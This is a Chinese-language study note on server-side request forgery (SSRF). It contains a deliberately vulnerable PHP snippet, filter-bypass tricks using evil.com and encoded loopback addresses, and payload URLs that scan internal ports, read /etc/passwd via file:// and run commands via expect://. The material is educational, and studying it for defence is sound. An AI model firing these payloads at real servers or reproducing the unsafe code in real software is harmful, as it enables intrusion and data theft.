## 9. SSRF
#SSRF
Server-Side Request Forgery 服务器端请求伪造（内网渗透）
### 9.1 形成
攻击者利用漏洞伪造服务器端发起请求，从而突破了客户端获取不到的数据限制，如内网资源、服务器本地资源等
```php
<?php
	$url=$_GET['url'];
	echo file_get_contents($url);
?>
```
对于上述代码构造payload：`http://example.com/ssrf.php?url=http://192.168.252.1:8000`可以检测内网主机HTTP服务8000端口的开放情况
### 9.2 防护绕过
经常通过正则表达式实现以下防护
- 限制请求特定的域名
- 禁止请求内网IP
可使用以下方法绕过
1. 使用`http://example.com@evil.com`这种格式绕过正则
2. IP地址转为进制（八、十、十六）及IP地址的省略写法
	- 0177.00.00.01（八进制）
	- 2130706433（十进制）
	- 0x7f.0x0.0x0.0x1（十六进制）
	- 127.1（省略写法）
	- 以上方法均表示127.0.0.1
3. 配置域名
如果手中有可控域名，可将域名A记录指向欲请求的IP绕过防护
`eval.example.com => 10.0.18.3`
### 9.3 危害与利用技巧
#### 9.3.1 [[常见端口|端口]]扫描
`http://example.com/ssrf.php?url=http://192.168.252.1:21`
`http://example.com/ssrf.php?url=http://192.168.252.1:22`
`http://example.com/ssrf.php?url=http://192.168.252.1:80`
`http://example.com/ssrf.php?url=http://192.168.252.1:443`
`http://example.com/ssrf.php?url=http://192.168.252.1:3306`
可通过应用响应时间、返回的错误信息、返回的服务Banner来判断端口是否开放
#### 9.3.2 攻击内网或本地存在漏洞的服务
如对HTTP发送的数据是否能被其他服务协议接收存在疑问，可参考Freebuf上的文章[[跨协议通信技术利用|《跨协议通信技术利用》]]
**Gopher协议**
详见[[利用 Gopher 协议拓展攻击面|《利用 Gopher 协议拓展攻击面》]]
#### 9.3.3 对内网Web应用进行指纹识别及攻击其中存在漏洞的应用
大多Web应用都有独特的文件和目录，通过这些文件可以识别出应用的类型，甚至详细的版本。以下payload可以识别主机是否安装了WordPress
`http://example.com/ssrf.php?url=http%3A%2F%2F127.0.0.1%3A8080%2Fwp-content%2Fthemes%2Fdefault%2Fimages%2faudio.jpg`
得到指纹后，便能有针对性地对其存在的漏洞进行利用
#### 9.3.4 文件读取
如果攻击者指定了file协议则可通过file协议来读取服务器上的文件内容
`http://example.com/ssrf.php?url=file:///etc/passwd`
#### 9.3.5 命令执行
PHP环境下如果安装了expect扩展还可以通过expect协议执行系统命令
`http://example.com/ssrf.php?url=expect://id`